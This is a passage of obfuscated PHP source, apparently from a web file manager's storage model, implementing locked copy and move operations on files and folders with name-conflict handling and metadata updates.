$this->_lockEvent($áŒ™“÷Ğ, array($‰–ä¼„–[639], $‰–ä¼„–[640]), $àÅ¹Õ); $this->_lockParent($áŒ™“÷Ğ, array($‰–ä¼„–[640]), $àÅ¹Õ); $this->_lockEvent($áŒ™“÷Ğ, array($‰–ä¼„–[641], $‰–ä¼„–[642]), $àÅ¹Õ); $this->_lockCheckEnd($‰–ä¼„–[638], $áŒ™“÷Ğ); } public function lockCopyEnd($ÙÈş§Öì) { $ Š°áâÄ =& $_SERVER[±Ö‰ô½¯]; if (!$this->allowLock()) { return; } $˜”Œ¹Â = 0; $this->_lockEvent($ÙÈş§Öì, array($ Š°áâÄ[639], $ Š°áâÄ[640]), $˜”Œ¹Â); $this->_lockParent($ÙÈş§Öì, array($ Š°áâÄ[640]), $˜”Œ¹Â); $this->_lockEvent($ÙÈş§Öì, array($ Š°áâÄ[641], $ Š°áâÄ[642]), $˜”Œ¹Â); } public function lockWriteStart($ã¼Æú, $ûÊ”Â˜Î = '') { $ÙïÊØ£÷ =& $_SERVER[±Ö‰ô½¯]; if (!$this->allowLock()) { return; } $this->_lockCheck($ÙïÊØ£÷[639], $ã¼Æú); $ù´€§ = 1; $this->_lockKey($ÙïÊØ£÷[643] . $ã¼Æú . $ÙïÊØ£÷[10] . $ûÊ”Â˜Î, $ù´€§); $this->_lockEvent($ã¼Æú, array($ÙïÊØ£÷[638], $ÙïÊØ£÷[640]), $ù´€§); $this->_lockParent($ã¼Æú, array($ÙïÊØ£÷[638], $ÙïÊØ£÷[640]), $ù´€§); $this->_lockCheckEnd($ÙïÊØ£÷[639], $ã¼Æú); } public function lockWriteEnd($„ÔÄøÚä, $Ù‡º£ë· = '') { $ƒ¸ò¤‡¿ =& $_SERVER[±Ö‰ô½¯]; if (!$this->allowLock()) { return; } $„²¶ûîß = 0; $this->_lockKey($ƒ¸ò¤‡¿[643] . $„ÔÄøÚä . $ƒ¸ò¤‡¿[10] . $Ù‡º£ë·, $„²¶ûîß); $this->_lockEvent($„ÔÄøÚä, array($ƒ¸ò¤‡¿[638], $ƒ¸ò¤‡¿[640]), $„²¶ûîß); $this->_lockParent($„ÔÄøÚä, array($ƒ¸ò¤‡¿[638], $ƒ¸ò¤‡¿[640]), $„²¶ûîß); } public function lockMoveStart($£Ùìòüı) { $çñ¡Š =& $_SERVER[±Ö‰ô½¯]; if (!$this->allowLock()) { return; } $this->_lockCheck($çñ¡Š[640], $£Ùìòüı); $°ìÄ¥»ü = 1; $this->_lockKey($çñ¡Š[644] . $£Ùìòüı, $°ìÄ¥»ü); $this->_lockEvent($£Ùìòüı, array($çñ¡Š[638], $çñ¡Š[639]), $°ìÄ¥»ü); $this->_lockParent($£Ùìòüı, array($çñ¡Š[638], $çñ¡Š[640]), $°ìÄ¥»ü); $this->_lockEvent($£Ùìòüı, array($çñ¡Š[645], $çñ¡Š[641], $çñ¡Š[642]), $°ìÄ¥»ü); $this->_lockCheckEnd($çñ¡Š[640], $£Ùìòüı); } public function lockMoveEnd($‡ö®·ƒ—) { $‰¤ø¨ì =& $_SERVER[±Ö‰ô½¯]; if (!$this->allowLock()) { return; } $–ÏÜñ¨Å = 0; $this->_lockKey($‰¤ø¨ì[644] . $‡ö®·ƒ—, $–ÏÜñ¨Å); $this->_lockEvent($‡ö®·ƒ—, array($‰¤ø¨ì[638], $‰¤ø¨ì[639]), $–ÏÜñ¨Å); $this->_lockParent($‡ö®·ƒ—, array($‰¤ø¨ì[638], $‰¤ø¨ì[640]), $–ÏÜñ¨Å); $this->_lockEvent($‡ö®·ƒ—, array($‰¤ø¨ì[645], $‰¤ø¨ì[641], $‰¤ø¨ì[642]), $–ÏÜñ¨Å); } private function _lockCheck($¤àŞßò, $àäÁş£) { $ãÃˆ½¶ =& $_SERVER[±Ö‰ô½¯]; $Éêï†şÔ = $this->sourceInfo($àäÁş£); $ïØÊ€éÃ = $¤àŞßò . $ãÃˆ½¶[10] . $àäÁş£; $this->_lockTimeStart[$ïØÊ€éÃ] = timeFloat(); if (!is_array($Éêï†şÔ)) { return; } $ìè÷Ö˜· = LNG($ãÃˆ½¶[646]); CacheLock::setErrorMsg($ãÃˆ½¶[175] . htmlspecialchars($Éêï†şÔ[$ãÃˆ½¶[32]]) . $ãÃˆ½¶[177] . $ìè÷Ö˜·); $this->_lockKey($ïØÊ€éÃ, 1); $this->_lockKey($ïØÊ€éÃ, 0); $˜‹£ë  = array_reverse($this->parentLevelArray($Éêï†şÔ[$ãÃˆ½¶[601]])); foreach ($˜‹£ë  as $ÅÚ‘Ê) { $ïØÊ€éÃ = $¤àŞßò . $ãÃˆ½¶[647] . $ÅÚ‘Ê; if (CacheLock::lockGet($ãÃˆ½¶[648] . $ïØÊ€éÃ)) { $Éêï†şÔ = $this->sourceInfo($ÅÚ‘Ê); CacheLock::setErrorMsg($ãÃˆ½¶[175] . htmlspecialchars($Éêï†şÔ[$ãÃˆ½¶[32]]) . $ãÃˆ½¶[177] . $ìè÷Ö˜·); $this->_lockKey($ïØÊ€éÃ, 1); $this->_lockKey($ïØÊ€éÃ, 0); } } } private function _lockCheckEnd($®ŸëÅ¢ë, $ŞÎã÷ô‡) { $ª›Å¿‡ =& $_SERVER[±Ö‰ô½¯]; $¿¸§­Ñ = $®ŸëÅ¢ë . $ª›Å¿‡[10] . $ŞÎã÷ô‡; CacheLock::setErrorMsg($ª›Å¿‡[464]); if (!isset($this->_lockTimeStart[$¿¸§­Ñ])) { return; } $îø½¿ûÈ = timeFloat() - $this->_lockTimeStart[$¿¸§­Ñ]; unset($this->_lockTimeStart[$¿¸§­Ñ]); if ($îø½¿ûÈ > 0.5) { unset(self::$cacheSourceInfo[$ª›Å¿‡[544] . $ŞÎã÷ô‡]); } $şĞÑØ‘ = $this->sourceInfo($ŞÎã÷ô‡); if (!$şĞÑØ‘) { show_json(LNG($ª›Å¿‡[106]), !1); } } private function _lockParent($Ÿ‰üÑ, $Ñ²Ò»Šü, $ªî°Õı…) { if (!$this->autoLockSet) { return; } $â‰³‚ = $this->sourceInfo($Ÿ‰üÑ); if (!is_array($â‰³‚)) { return; } $‚°¿¢œ = array_reverse($this->parentLevelArray($â‰³‚[$_SERVER[±Ö‰ô½¯][601]])); foreach ($‚°¿¢œ as $ èáõö) { $this->_lockEvent($ èáõö, $Ñ²Ò»Šü, $ªî°Õı…); } } private function _lockEvent($×¤…€, $ì …Ã±ş, $Á£”‹ÌØ) { $›Îã­óõ =& $_SERVER[±Ö‰ô½¯]; if (!$this->autoLockSet) { return; } foreach ($ì …Ã±ş as $ÈÔï™õá) { $Š“Äá = $ÈÔï™õá . $›Îã­óõ[10] . $×¤…€; if ($Á£”‹ÌØ && CacheLock::lockGet($›Îã­óõ[648] . $Š“Äá)) { continue; } $this->_lockKey($Š“Äá, $Á£”‹ÌØ); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($àÚ…’õ, $È•ãÛ±¯ = 1) { $î«×Ô Ò = $_SERVER[±Ö‰ô½¯][648] . md5($àÚ…’õ); if ($È•ãÛ±¯) { if (isset(self::$_lockItemArr[$î«×Ô Ò])) { return; } self::$_lockItemArr[$î«×Ô Ò] = 1; CacheLock::lock($î«×Ô Ò, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$î«×Ô Ò])) { return; } unset(self::$_lockItemArr[$î«×Ô Ò]); CacheLock::unlock($î«×Ô Ò); } } public function isParentOf($²öå÷ÜË, $í‰â¼Ï) { $ÒÌÌôÊ§ =& $_SERVER[±Ö‰ô½¯]; $ÎŒ•¡’­ = $this->sourceInfo($²öå÷ÜË); $¢›Ÿ®Ü“ = $this->sourceInfo($í‰â¼Ï); $©ÎúÊõì = $ÎŒ•¡’­[$ÒÌÌôÊ§[601]] . $ÎŒ•¡’­[$ÒÌÌôÊ§[193]] . $ÒÌÌôÊ§[50]; $ûÓÚß€ = $¢›Ÿ®Ü“[$ÒÌÌôÊ§[601]] . $¢›Ÿ®Ü“[$ÒÌÌôÊ§[193]] . $ÒÌÌôÊ§[50]; $¶¶×îÂ = strpos($ûÓÚß€, $©ÎúÊõì) === 0; return $¶¶×îÂ; } private $targetIsDelete = 0; public function copy($áÛÕåü, $ üÚË¨œ, $ï½§¢ÕŞ = REPEAT_REPLACE, $üå¬–‰ = '') { $‚­±»£ =& $_SERVER[±Ö‰ô½¯]; $éòè¶Ò = $this->sourceInfo($áÛÕåü); $šÕœ¸Àø = $this->sourceInfo($ üÚË¨œ); if (!$éòè¶Ò || !$šÕœ¸Àø || $šÕœ¸Àø[$‚­±»£[497]] != $‚­±»£[91]) { return !1; } if ($this->isParentOf($áÛÕåü, $ üÚË¨œ)) { return !1; } $÷ûõ­ß¨ = $üå¬–‰ ? $üå¬–‰ : $éòè¶Ò[$‚­±»£[32]]; $this->lockCopyStart($áÛÕåü); $this->lockWriteStart($ üÚË¨œ, $÷ûõ­ß¨); $ªŸ„¡ = array($‚­±»£[649] => array(), $‚­±»£[650] => array(), $‚­±»£[651] => array()); $this->targetIsDelete = intval($éòè¶Ò[$‚­±»£[517]]); $©ã¢ˆÈ¿ = $this->fileNameExistAuto($ üÚË¨œ, $éòè¶Ò); $­ê›¹¥ = $this->_copy($áÛÕåü, $ üÚË¨œ, $ï½§¢ÕŞ, $ªŸ„¡, !0, $üå¬–‰); $this->_childrenListClear(); $this->lockCopyEnd($áÛÕåü); $this->lockWriteEnd($ üÚË¨œ, $÷ûõ­ß¨); if ($éòè¶Ò[$‚­±»£[497]] == $‚­±»£[91] && $©ã¢ˆÈ¿ == $­ê›¹¥) { $this->folderSizeResetChildren($©ã¢ˆÈ¿); } Model($‚­±»£[652])->addAll($ªŸ„¡[$‚­±»£[650]], array(), !0); if ($©ã¢ˆÈ¿ != $­ê›¹¥ || $éòè¶Ò[$‚­±»£[497]] == $‚­±»£[91]) { Model($‚­±»£[653])->eventCopy($­ê›¹¥); } $this->saveAll($ªŸ„¡[$‚­±»£[651]]); Model($‚­±»£[232])->linkAdd($ªŸ„¡[$‚­±»£[649]]); $this->folderSizeReset($ üÚË¨œ); $this->updateModifyTime($ üÚË¨œ); return $­ê›¹¥; } private function _copy($ëªºÎÏ³, $óÚù°ùÈ, $ä³œ…ç¨, &$³šÄ¦…ˆ, $‹ÕÂğĞş, $‚Ô‰Ì‘œ = '') { $¾¹ı®øı =& $_SERVER[±Ö‰ô½¯]; $¿·òâá£ = $this->sourceInfoCache($ëªºÎÏ³); $ú™éº¡Ÿ = $¿·òâá£[$¾¹ı®øı[497]] == $¾¹ı®øı[91]; $¥¿ˆŠŒä = $‚Ô‰Ì‘œ ? $‚Ô‰Ì‘œ : $¿·òâá£[$¾¹ı®øı[32]]; $ˆïû„È‡ = $this->fileNameExistAuto($óÚù°ùÈ, $¿·òâá£); if ($‹ÕÂğĞş) { $this->_childrenAllMake($ëªºÎÏ³); if ($ú™éº¡Ÿ && $ˆïû„È‡) { $this->_childrenAllMake($ˆïû„È‡); } } if (!$ˆïû„È‡) { return $this->_copyCreate($ëªºÎÏ³, $óÚù°ùÈ, $¥¿ˆŠŒä, $³šÄ¦…ˆ); } $µ àšÀš = $ˆïû„È‡; if ($ú™éº¡Ÿ) { if ($ä³œ…ç¨ == REPEAT_RENAME_FOLDER) { $¥¿ˆŠŒä = $this->fileNameAutoCache($óÚù°ùÈ, $¥¿ˆŠŒä, $ä³œ…ç¨, $ú™éº¡Ÿ); $µ àšÀš = $this->_copyCreate($ëªºÎÏ³, $óÚù°ùÈ, $¥¿ˆŠŒä, $³šÄ¦…ˆ); } else { $Ï¹ó…Á = $this->_childrenList($ëªºÎÏ³); foreach ($Ï¹ó…Á as $±×É˜ƒ¦) { $this->_copy($±×É˜ƒ¦[$¾¹ı®øı[193]], $ˆïû„È‡, $ä³œ…ç¨, $³šÄ¦…ˆ, !1); } } } else { if ($ä³œ…ç¨ == REPEAT_RENAME || $ä³œ…ç¨ == REPEAT_RENAME_FOLDER) { $¥¿ˆŠŒä = $this->fileNameAutoCache($óÚù°ùÈ, $¥¿ˆŠŒä, $ä³œ…ç¨, $ú™éº¡Ÿ); $µ àšÀš = $this->_copyCreate($ëªºÎÏ³, $óÚù°ùÈ, $¥¿ˆŠŒä, $³šÄ¦…ˆ); } else { if ($ä³œ…ç¨ == REPEAT_REPLACE) { $‘Æ“óŸˆ = $this->sourceInfoCache($ˆïû„È‡); $¤¨¢æ›¶ = $this->fileHistory($‘Æ“óŸˆ, $¿·òâá£[$¾¹ı®øı[554]], $¿·òâá£[$¾¹ı®øı[79]]); if ($¤¨¢æ›¶) { $³šÄ¦…ˆ[$¾¹ı®øı[649]][] = $¿·òâá£[$¾¹ı®øı[554]]; } } else { if ($ä³œ…ç¨ == REPEAT_SKIP) { } } } Hook::trigger($¾¹ı®øı[654], array($¾¹ı®øı[655], $¿·òâá£, 0)); } return $µ àšÀš; } private function _copyCreate($ùüß”Š, $ı—™¢ßŸ, $ŞĞÉëÙı, &$ø–‘ŠË¸) { $İãíàô· =& $_SERVER[±Ö‰ô½¯]; $¦Ö²ÓÊ² = $this->sourceInfoCache($ùüß”Š); $Å±™ë¬÷ = $this->sourceInfoCache($ı—™¢ßŸ); $èåáåÏÑ = $this->_makeItemData($¦Ö²ÓÊ², $Å±™ë¬÷, $ŞĞÉëÙı); Hook::trigger($İãíàô·[656], $èåáåÏÑ); Hook::trigger($İãíàô·[657], array($İãíàô·[658], $èåáåÏÑ, 0)); $™ÔÛàÔ™ = $this->add($èåáåÏÑ); $º²ŒËÎƒ = array($İãíàô·[193] => $™ÔÛàÔ™, $İãíàô·[32] => $ŞĞÉëÙı); $this->_copyApplyMeta($º²ŒËÎƒ, $ø–‘ŠË¸); if ($¦Ö²ÓÊ²[$İãíàô·[497]] != $İãíàô·[91]) { $ø–‘ŠË¸[$İãíàô·[649]][] = $¦Ö²ÓÊ²[$İãíàô·[554]]; return $™ÔÛàÔ™; } $­°×öÛŠ = array(); $¡ëøÉø = array(); $this->_childrenListAll($ùüß”Š, $­°×öÛŠ); $»á¹ë²‰ = count($­°×öÛŠ); if ($»á¹ë²‰ == 0) { return $™ÔÛàÔ™; } $ËÊøµòƒ = $this->sourceInfo($™ÔÛàÔ™); foreach ($­°×öÛŠ as $ş›…®) { $àá‰üƒ = $this->_makeItemData($ş›…®, $ËÊøµòƒ, $ş›…®[$İãíàô·[32]]); $àá‰üƒ[$İãíàô·[601]] = $ş›…®[$İãíàô·[601]]; $¡ëøÉø[] = $àá‰üƒ; } $this->chunkEventSet($İãíàô·[659], array($İãíàô·[660], $èåáåÏÑ, $»á¹ë²‰)); $this->addAll($¡ëøÉø, array(), !1); $Ëïä©í = $this->where(array($İãíàô·[192] => $™ÔÛàÔ™))->select(); $å¦ÄïÖ = $this->_childrenMakeRelation($­°×öÛŠ, $Ëïä©í); $å¦ÄïÖ[$ùüß”Š] = $™ÔÛàÔ™; $Ìıˆ…é = array(); $æ‚­Ë»æ = array(); foreach ($Ëïä©í as $ş›…®) { $šó™±š = $ş›…®[$İãíàô·[193]]; $†âÍ¢Å‰ = $this->_childrenMatch($å¦ÄïÖ, $ş›…®, $ËÊøµòƒ); $Ìıˆ…é[] = array($İãíàô·[193], $šó™±š, $İãíàô·[192], $†âÍ¢Å‰[$İãíàô·[192]]); $æ‚­Ë»æ[] = array($İãíàô·[193], $šó™±š, $İãíàô·[601], $†âÍ¢Å‰[$İãíàô·[601]]); $this->_copyApplyMeta($ş›…®, $ø–‘ŠË¸); if ($ş›…®[$İãíàô·[497]] != $İãíàô·[91]) { $ø–‘ŠË¸[$İãíàô·[649]][] = $ş›…®[$İãíàô·[554]]; } } $this->chunkEventSet($İãíàô·[661], array($İãíàô·[662], $èåáåÏÑ, $»á¹ë²‰)); $this->saveAll($Ìıˆ…é); $this->chunkEventSet($İãíàô·[663], array($İãíàô·[664], $èåáåÏÑ, $»á¹ë²‰)); $this->saveAll($æ‚­Ë»æ); return $™ÔÛàÔ™; } private function _childrenMakeRelation($ñ›óˆàÄ, $×º×ïú¾) { $şàÔö =& $_SERVER[±Ö‰ô½¯]; $¾¢«öØ = array(); $æ»·œ¨é = array(); foreach ($ñ›óˆàÄ as $“ÍŠåÂ) { $¶õğ = $“ÍŠåÂ[$şàÔö[32]] . $şàÔö[8] . $“ÍŠåÂ[$şàÔö[601]]; $¾¢«öØ[$¶õğ] = $“ÍŠåÂ[$şàÔö[193]]; } foreach ($×º×ïú¾ as $“ÍŠåÂ) { $¶õğ = $“ÍŠåÂ[$şàÔö[32]] . $şàÔö[8] . $“ÍŠåÂ[$şàÔö[601]]; $¬íå¨²´ = $¾¢«öØ[$¶õğ]; $æ»·œ¨é[$¬íå¨²´] = $“ÍŠåÂ[$şàÔö[193]]; } return $æ»·œ¨é; } private function _childrenMatch($ùšïçü¬, $ç¡‡°íü, $³õ©Œ·¡) { $·Â‡¸¦É =& $_SERVER[±Ö‰ô½¯]; $ò¥£ªêÒ = $³õ©Œ·¡[$·Â‡¸¦É[601]]; $¿†ù‰Â = $this->parentLevelArray($ç¡‡°íü[$·Â‡¸¦É[601]]); foreach ($¿†ù‰Â as $Î¬—›Ø ) { if (isset($ùšïçü¬[$Î¬—›Ø ])) { $ò¥£ªêÒ .= $ùšïçü¬[$Î¬—›Ø ] . $·Â‡¸¦É[665]; } } $ò¥£ªêÒ = rtrim($ò¥£ªêÒ, $·Â‡¸¦É[50]) . $·Â‡¸¦É[50]; $¥°îöµ = $this->parentLevelArray($ò¥£ªêÒ); $õƒŞİ‘” = $¥°îöµ[count($¥°îöµ) - 1]; return array($·Â‡¸¦É[192] => $õƒŞİ‘”, $·Â‡¸¦É[601] => $ò¥£ªêÒ); } private function _makeItemData($ó‡ú®¥, $òÜ“íåË, $ù«Ãó‰¨) { $ò”şÏ¸ö =& $_SERVER[±Ö‰ô½¯]; $ù¨õö¸¸ = array($ò”şÏ¸ö[666] => $ó‡ú®¥[$ò”şÏ¸ö[497]], $ò”şÏ¸ö[506] => $ù«Ãó‰¨, $ò”şÏ¸ö[667] => $ó‡ú®¥[$ò”şÏ¸ö[498]] ? $ó‡ú®¥[$ò”şÏ¸ö[498]] : $ò”şÏ¸ö[12], $ò”şÏ¸ö[555] => $ó‡ú®¥[$ò”şÏ¸ö[554]] ? $ó‡ú®¥[$ò”şÏ¸ö[554]] : 0, $ò”şÏ¸ö[637] => $ó‡ú®¥[$ò”şÏ¸ö[79]] ? $ó‡ú®¥[$ò”şÏ¸ö[79]] : 0, $ò”şÏ¸ö[668] => intval($òÜ“íåË[$ò”şÏ¸ö[190]]), $ò”şÏ¸ö[669] => intval($òÜ“íåË[$ò”şÏ¸ö[586]]), $ò”şÏ¸ö[670] => intval(USER_ID), $ò”şÏ¸ö[671] => intval(USER_ID), $ò”şÏ¸ö[489] => intval($òÜ“íåË[$ò”şÏ¸ö[193]]), $ò”şÏ¸ö[672] => $òÜ“íåË[$ò”şÏ¸ö[601]] . $òÜ“íåË[$ò”şÏ¸ö[193]] . $ò”şÏ¸ö[50], $ò”şÏ¸ö[510] => $ó‡ú®¥[$ò”şÏ¸ö[88]] ? $ó‡ú®¥[$ò”şÏ¸ö[88]] : time(), $ò”şÏ¸ö[516] => 0, $ò”şÏ¸ö[673] => $ò”şÏ¸ö[12]); return $ù¨õö¸¸; } private function _copyApplyMeta($ºü¹ó¡“, &$÷ÔÏ–€Ó) { $ƒì¬óã =& $_SERVER[±Ö‰ô½¯]; $Â¾îı§Ø = $ºü¹ó¡“[$ƒì¬óã[193]]; $ø¼ë»®ä = $ºü¹ó¡“[$ƒì¬óã[32]]; if (!isset($ºü¹ó¡“[$ƒì¬óã[674]]) || !$ºü¹ó¡“[$ƒì¬óã[674]] || $ºü¹ó¡“[$ƒì¬óã[674]] == $ƒì¬óã[230]) { $÷ÔÏ–€Ó[$ƒì¬óã[651]][] = array($ƒì¬óã[193], $Â¾îı§Ø, $ƒì¬óã[674], short_id($Â¾îı§Ø)); } if (Input::check($ø¼ë»®ä, $ƒì¬óã[675])) { $÷ÔÏ–€Ó[$ƒì¬óã[650]][] = array($ƒì¬óã[193] => $Â¾îı§Ø, $ƒì¬óã[95] => $ƒì¬óã[549], $ƒì¬óã[452] => str_replace($ƒì¬óã[53], $ƒì¬óã[12], Pinyin::get($ø¼ë»®ä))); $÷ÔÏ–€Ó[$ƒì¬óã[650]][] = array($ƒì¬óã[193] => $Â¾îı§Ø, $ƒì¬óã[95] => $ƒì¬óã[548], $ƒì¬óã[452] => Pinyin::get($ø¼ë»®ä, $ƒì¬óã[676])); } $÷ÔÏ–€Ó[$ƒì¬óã[650]][] = array($ƒì¬óã[193] => $Â¾îı§Ø, $ƒì¬óã[95] => $ƒì¬óã[528], $ƒì¬óã[452] => KodSort::makeStr($ø¼ë»®ä)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($Ü°Û£½Ê) { $­ıä…ºŠ =& $_SERVER[±Ö‰ô½¯]; $Ÿëéµõ = $this->sourceInfo($Ü°Û£½Ê); $À¾¨Ü¾Ù = $­ıä…ºŠ[677]; $–Ó£‚ãÄ = array($­ıä…ºŠ[601] => array($­ıä…ºŠ[632], $Ÿëéµõ[$­ıä…ºŠ[601]] . $Ü°Û£½Ê . $­ıä…ºŠ[633]), $­ıä…ºŠ[517] => $this->targetIsDelete); $ƒ„ûŞß¸ = $this->field($À¾¨Ü¾Ù)->where($–Ó£‚ãÄ)->select(); if (!$ƒ„ûŞß¸) { return; } $ƒ„ûŞß¸ = array_to_keyvalue($ƒ„ûŞß¸, $­ıä…ºŠ[193]); foreach ($ƒ„ûŞß¸ as $äö‰Àêİ) { $øæÙƒí™ = $äö‰Àêİ[$­ıä…ºŠ[192]]; $Ü°Û£½Ê = $äö‰Àêİ[$­ıä…ºŠ[193]]; if (!isset($this->_childrenListCache[$Ü°Û£½Ê]) && $äö‰Àêİ[$­ıä…ºŠ[497]] == $­ıä…ºŠ[91]) { $this->_childrenListCache[$Ü°Û£½Ê] = array(); } if (!isset($this->_childrenListCache[$øæÙƒí™])) { $this->_childrenListCache[$øæÙƒí™] = array(); } $this->_childrenListCache[$øæÙƒí™][$Ü°Û£½Ê] = $äö‰Àêİ; $this->_childrenItemCache[$Ü°Û£½Ê] = $äö‰Àêİ; } } private function _childrenListAll($³ÇšêíÊ, &$×¼ÜƒäĞ) { $ñİÏœ£ =& $_SERVER[±Ö‰ô½¯]; if (!isset($this->_childrenListCache[$³ÇšêíÊ])) { return; } $¤—ÁùŒ = $this->_childrenListCache[$³ÇšêíÊ]; foreach ($¤—ÁùŒ as $˜‰ÄÈ¬´ => $ÍÃğéğå) { $×¼ÜƒäĞ[$˜‰ÄÈ¬´] = $ÍÃğéğå; if ($ÍÃğéğå[$ñİÏœ£[497]] == $ñİÏœ£[91]) { $this->_childrenListAll($˜‰ÄÈ¬´, $×¼ÜƒäĞ); } } } private function sourceInfoCache($½«±Ç£Ç) { if (isset($this->_childrenItemCache[$½«±Ç£Ç])) { return $this->_childrenItemCache[$½«±Ç£Ç]; } return $this->sourceInfo($½«±Ç£Ç); } private function _childrenList($ş¨ÍšŞ³) { if (isset($this->_childrenListCache[$ş¨ÍšŞ³])) { return $this->_childrenListCache[$ş¨ÍšŞ³]; } return $this->_childrenListSelect($ş¨ÍšŞ³); } private function _childrenListSelect($æÒïú) { $‚‹øŸÂÑ =& $_SERVER[±Ö‰ô½¯]; $çŠ±íË = array($‚‹øŸÂÑ[192] => $æÒïú, $‚‹øŸÂÑ[517] => $this->targetIsDelete); $‡Ã½Ò» = $this->where($çŠ±íË)->select(); $‡Ã½Ò» = $‡Ã½Ò» ? $‡Ã½Ò» : array(); $³îÑ‚ˆ´ = array_to_keyvalue($‡Ã½Ò», $‚‹øŸÂÑ[193]); $this->_childrenListCache[$æÒïú] = $³îÑ‚ˆ´; foreach ($³îÑ‚ˆ´ as $æÒïú => $õ§®¢¸­) { $this->_childrenItemCache[$æÒïú] = $õ§®¢¸­; } return $³îÑ‚ˆ´; } private function fileNameExistAuto($¢å¨öø¿, $äˆ˜¼ü) { $ŠåÈ¿ö× =& $_SERVER[±Ö‰ô½¯]; if ($äˆ˜¼ü[$ŠåÈ¿ö×[517]] == $ŠåÈ¿ö×[91]) { return $this->fileNameExist($¢å¨öø¿, $äˆ˜¼ü[$ŠåÈ¿ö×[32]]); } return $this->fileNameExistCache($¢å¨öø¿, $äˆ˜¼ü[$ŠåÈ¿ö×[32]]); } private function fileNameExistCache($ºƒòŠàÆ, $Ìì•£õ†) { $ì¿Ã¸ì =& $_SERVER[±Ö‰ô½¯]; $Ìì•£õ† = strtolower($Ìì•£õ†); $·›“ˆ¦é = $this->_childrenList($ºƒòŠàÆ); foreach ($·›“ˆ¦é as $’ÒœØ ©) { if ($Ìì•£õ† == strtolower($’ÒœØ ©[$ì¿Ã¸ì[32]])) { return $’ÒœØ ©[$ì¿Ã¸ì[193]]; } } return !1; } private function fileNameAutoCache($ò¦„¦ÈĞ, $äƒãˆ, $×³¤ø›ì, $“®¼æ™î) { $œØåó =& $_SERVER[±Ö‰ô½¯]; $¯ôã°İĞ = $this->_childrenList($ò¦„¦ÈĞ); $Ë¶Åìªã = array_to_keyvalue($¯ôã°İĞ, $œØåó[12], $œØåó[32]); return $this->fileNameAutoGet($Ë¶Åìªã, $äƒãˆ, $×³¤ø›ì, $“®¼æ™î); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($Ñ‚“¿‘õ, $ÂÜ’ùÔ¸, $‚ óÓÏ = REPEAT_REPLACE, $‰ºÌ´– = '') { $±¼ÈÛå¸ =& $_SERVER[±Ö‰ô½¯]; $©Àìô«ë = $this->sourceInfo($Ñ‚“¿‘õ); $‹‡‚ëŠ = $this->sourceInfo($ÂÜ’ùÔ¸); if ($©Àìô«ë[$±¼ÈÛå¸[192]] == $‹‡‚ëŠ[$±¼ÈÛå¸[193]]) { if ($©Àìô«ë[$±¼ÈÛå¸[517]] == $±¼ÈÛå¸[91]) { Model($±¼ÈÛå¸[515])->restore(array($Ñ‚“¿‘õ)); } if (!$‰ºÌ´– || $‰ºÌ´– == $©Àìô«ë[$±¼ÈÛå¸[32]]) { return $Ñ‚“¿‘õ; } } $“æµ…¿Ê = $this->pathInfoMore($Ñ‚“¿‘õ); if ($this->isParentOf($Ñ‚“¿‘õ, $ÂÜ’ùÔ¸)) { return !1; } if (!$©Àìô«ë || !$‹‡‚ëŠ || $‹‡‚ëŠ[$±¼ÈÛå¸[497]] != $±¼ÈÛå¸[91]) { return !1; } Hook::trigger($±¼ÈÛå¸[678], $“æµ…¿Ê); $this->targetIsDelete = intval($©Àìô«ë[$±¼ÈÛå¸[517]]); if ($©Àìô«ë[$±¼ÈÛå¸[192]] == $ÂÜ’ùÔ¸ && $‰ºÌ´– != $©Àìô«ë[$±¼ÈÛå¸[32]]) { $¶Å¬®Ÿ€ = $this->fileNameExist($ÂÜ’ùÔ¸, $‰ºÌ´–); if ($¶Å¬®Ÿ€ && $©Àìô«ë[$±¼ÈÛå¸[497]] == $±¼ÈÛå¸[230]) { $³‘Õæ£ = $this->sourceInfo($¶Å¬®Ÿ€); $ß”¶Œü¼ = $this->fileHistory($³‘Õæ£, $©Àìô«ë[$±¼ÈÛå¸[554]], $©Àìô«ë[$±¼ÈÛå¸[79]]); if (!$ß”¶Œü¼) { Model($±¼ÈÛå¸[557])->remove($©Àìô«ë[$±¼ÈÛå¸[554]]); } $this->removeNow($Ñ‚“¿‘õ, !1); $this->folderSizeReset($ÂÜ’ùÔ¸); Hook::trigger($±¼ÈÛå¸[679], $“æµ…¿Ê); return $¶Å¬®Ÿ€; } } $Äñ­â±¶ = $‰ºÌ´– ? $‰ºÌ´– : $©Àìô«ë[$±¼ÈÛå¸[32]]; $this->lockMoveStart($Ñ‚“¿‘õ); $this->lockWriteStart($ÂÜ’ùÔ¸, $Äñ­â±¶); $åîöèêô = array($±¼ÈÛå¸[649] => array(), $±¼ÈÛå¸[680] => !1); $this->clearShare($Ñ‚“¿‘õ, $ÂÜ’ùÔ¸); $îÚ÷è³ = $this->fileNameExistAuto($ÂÜ’ùÔ¸, $©Àìô«ë); $±ººÎ–Œ = $this->_move($Ñ‚“¿‘õ, $ÂÜ’ùÔ¸, $‚ óÓÏ, $åîöèêô, $‰ºÌ´–); $this->sourceCacheClear(); if ($©Àìô«ë[$±¼ÈÛå¸[497]] == $±¼ÈÛå¸[91] && $îÚ÷è³) { $this->folderSizeResetChildren($±ººÎ–Œ); } Model($±¼ÈÛå¸[232])->linkAdd($åîöèêô[$±¼ÈÛå¸[649]]); if ($±ººÎ–Œ && $îÚ÷è³ && $åîöèêô[$±¼ÈÛå¸[680]]) { $§‘öØ½ı = $©Àìô«ë[$±¼ÈÛå¸[497]] == $±¼ÈÛå¸[91] ? $this->_childrenListSelect($Ñ‚“¿‘õ) : !1; $»äõÕû¾ = $§‘öØ½ı && count($§‘öØ½ı) > 0 ? !0 : !1; $this->removeNow($Ñ‚“¿‘õ, $»äõÕû¾); } $this->lockMoveEnd($Ñ‚“¿‘õ); $this->lockWriteEnd($ÂÜ’ùÔ¸, $Äñ­â±¶); $this->folderSizeReset($©Àìô«ë[$±¼ÈÛå¸[192]]); $this->folderSizeReset($ÂÜ’ùÔ¸); $ğë÷—â¢ = array($©Àìô«ë[$±¼ÈÛå¸[192]], $ÂÜ’ùÔ¸); if ($©Àìô«ë[$±¼ÈÛå¸[497]] == $±¼ÈÛå¸[91]) { $ğë÷—â¢[] = $Ñ‚“¿‘õ; } $this->updateModifyTime($ğë÷—â¢); Model($±¼ÈÛå¸[653])->eventMove($Ñ‚“¿‘õ, 